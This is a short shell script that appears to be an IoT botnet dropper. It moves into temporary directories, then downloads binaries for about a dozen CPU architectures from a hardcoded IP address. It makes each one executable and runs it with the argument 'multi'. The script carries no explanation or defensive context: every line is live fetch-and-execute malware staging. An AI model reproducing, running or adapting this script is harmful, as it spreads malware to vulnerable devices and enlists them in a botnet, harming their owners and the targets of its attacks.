#!/bin/sh
cd /tmp
cd /var/tmp
cd /tmp/tmpfs
cd /dev/shm
cd /var/run

rm -rf o; wget http://103.149.87.69/d/arm     -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/arm5    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/arm6    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/arm7    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/mips    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/mpsl    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/ppc     -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/i686    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/arc     -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/sh4     -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/m68k    -O- > o; chmod 777 o; ./o multi
rm -rf o; wget http://103.149.87.69/d/spc     -O- > o; chmod 777 o; ./o multi
